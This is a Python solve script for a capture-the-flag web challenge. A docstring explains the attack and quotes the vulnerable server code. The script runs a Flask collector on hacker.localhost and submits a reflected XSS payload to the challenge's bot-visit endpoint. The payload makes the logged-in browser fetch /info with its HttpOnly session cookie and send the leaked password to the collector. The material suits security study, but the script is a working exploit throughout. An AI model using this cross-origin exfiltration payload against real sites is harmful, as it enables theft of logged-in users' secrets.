import os
import re
import requests
import signal
from flask import Flask, request


"""
Theory:
	Same as with a normal XSS attack. Due to the http only property set on the cookie
	however, we will not be able to acces it via dom and therefore will not be able to
	retrieve it since the challenge endpoint does not support the trace methond for example.

	The cookie will still be sent along all requests to the challenge.localhost domain. This lets
	us reqeuest the info endpoint to get the flag and then send the output of this request to our
	cross site server.

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/info":
        session_user_id = int(session.get("user", -1))
        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()

        request_user_id = int(request.args.get("user", session_user_id))
        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
        assert request_user, "Invalid `user`"

        info = [request_user["username"]]
        if request_user_id == session_user_id:
            info.append(request_user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
"""


pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)
	os.close(w_pipe1)

	app = Flask(__name__)

	args = []

	@app.route("/", methods=["GET", "POST"])
	def leak():
		if request.args.get("leak", "") == "":
			return f"{args}", 200
		else:
			args.append(request.args.get("leak", ""))
			return "Success", 200

	app.run("hacker.localhost", 30080, debug=False)
	print("Exit run. Might be due to signal.")
	exit(0)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/visit"
		# we have to percent escape both && and the + sign since both would be interpreted as special characters within a query string of the url
		xss = '<script>var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() {if(xhr.readyState == 4 %26%26 xhr.status == 200) {' \
		'var resp = xhr.responseText.split(" "); var xhrb = new XMLHttpRequest(); xhrb.open("GET", "http://hacker.localhost:30080/?leak="%2bresp[1], false); xhrb.send();}}; ' \
		'xhr.withCredentials = true; xhr.open("GET", "http://challenge.localhost:80/info", false); xhr.send();</script>'
		data = {"url": f"http://challenge.localhost:80/echo?echo={xss}"}
		r = requests.get(url, params=data)
		url = "http://hacker.localhost:30080/"
		r = requests.get(url)
		print(r.text)
		os.kill(pid, signal.SIGINT)
